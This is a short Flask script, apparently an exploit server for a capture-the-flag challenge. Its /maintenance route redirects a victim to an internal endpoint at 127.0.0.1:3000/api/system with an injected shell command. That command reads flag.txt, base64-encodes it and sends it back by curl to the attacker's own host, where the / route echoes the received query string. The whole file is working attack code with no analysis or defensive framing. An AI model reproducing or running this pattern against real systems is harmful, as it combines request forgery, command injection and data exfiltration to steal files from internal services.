from flask import Flask, redirect, request
from urllib.parse import quote_plus

app = Flask(__name__)

@app.route("/")
def home():
    return request.query_string

@app.route("/maintenance")
def maintenance():
    url = "http://127.0.0.1:3000/api/system?cmd="
    cmd = f"curl -s http://{request.remote_addr}:5000/?f=`cat flag.txt | base64`"
    return redirect(url + quote_plus(cmd))

if __name__ == '__main__':
    app.run('0.0.0.0', port=5000, debug=True)